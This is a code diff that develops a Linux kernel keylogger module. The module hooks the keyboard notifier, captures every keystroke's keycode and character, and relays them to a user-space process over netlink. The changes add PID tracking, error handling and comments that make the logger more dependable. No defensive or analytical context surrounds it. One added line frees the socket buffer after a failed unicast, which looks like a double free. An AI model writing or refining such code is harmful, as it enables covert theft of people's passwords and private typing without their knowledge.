@@ -11,31 +11,46 @@
 #define NETLINK_USER 31
 
 struct sock *nl_sk = NULL;
+static int user_pid = 0;  // Global PID storage for the user-space application
 
 static void send_keystroke_to_user(int keycode, char ascii_char) {
     struct sk_buff *skb_out;
     struct nlmsghdr *nlh;
     int msg_size = sizeof(int) + sizeof(char);
-    int pid = 0;  // Use your user-space application PID here
     int res;
 
-    char msg[msg_size];
-    memcpy(msg, &keycode, sizeof(int));
-    memcpy(msg + sizeof(int), &ascii_char, sizeof(char));
+    // Ensure user_pid is set before trying to send
+    if (user_pid == 0) {
+        printk(KERN_WARNING "Keylogger: User PID not set. Cannot send message.\n");
+        return;
+    }
 
-    skb_out = nlmsg_new(msg_size, 0);
+    // Allocate a new socket buffer
+    skb_out = nlmsg_new(msg_size, GFP_KERNEL);
     if (!skb_out) {
         printk(KERN_ERR "Keylogger: Failed to allocate new skb\n");
         return;
     }
 
+    // Fill the netlink message header
     nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);
-    NETLINK_CB(skb_out).dst_group = 0;  // Not in multicast group
-    memcpy(nlmsg_data(nlh), msg, msg_size);
+    if (!nlh) {
+        printk(KERN_ERR "Keylogger: Failed to add message to skb\n");
+        kfree_skb(skb_out);  // Free skb on error
+        return;
+    }
 
-    res = nlmsg_unicast(nl_sk, skb_out, pid);
+    NETLINK_CB(skb_out).dst_group = 0;  // Not in multicast group
+
+    // Copy the keystroke data into the message payload
+    memcpy(nlmsg_data(nlh), &keycode, sizeof(int));
+    memcpy(nlmsg_data(nlh) + sizeof(int), &ascii_char, sizeof(char));
+
+    // Send the message to the user-space application
+    res = nlmsg_unicast(nl_sk, skb_out, user_pid);
     if (res < 0) {
-        printk(KERN_INFO "Keylogger: Error while sending to user-space\n");
+        printk(KERN_ERR "Keylogger: Error while sending message to user-space, res=%d\n", res);
+        kfree_skb(skb_out);  // Free skb if unicast fails
     }
 }
 
@@ -56,9 +71,9 @@ static struct notifier_block keylogger_nb = {
 
 static void netlink_recv_msg(struct sk_buff *skb) {
     struct nlmsghdr *nlh = (struct nlmsghdr *)skb->data;
-    int pid = nlh->nlmsg_pid; // PID of sending process
-    printk(KERN_INFO "Netlink received msg payload: %s\n", (char *)nlmsg_data(nlh));
-    // Store PID for responding to user-space
+    user_pid = nlh->nlmsg_pid; // Store the PID for responding to user-space
+    printk(KERN_INFO "Netlink: Received message from PID: %d\n", user_pid);
+    // Optionally, handle more data from user-space if needed
 }
 
 static int __init keylogger_init(void) {
@@ -77,7 +92,7 @@ static int __init keylogger_init(void) {
     };
     nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, &cfg);
     if (!nl_sk) {
-        printk(KERN_ALERT "Error creating socket.\n");
+        printk(KERN_ALERT "Keylogger: Error creating socket.\n");
         unregister_keyboard_notifier(&keylogger_nb);
         return -ENOMEM;
     }
@@ -93,7 +108,9 @@ static void __exit keylogger_exit(void) {
     unregister_keyboard_notifier(&keylogger_nb);
 
     // Close the netlink socket
-    netlink_kernel_release(nl_sk);
+    if (nl_sk) {
+        netlink_kernel_release(nl_sk);
+    }
 
     printk(KERN_INFO "Keylogger Module: Unregistered keyboard notifier and closed netlink socket successfully\n");
 }
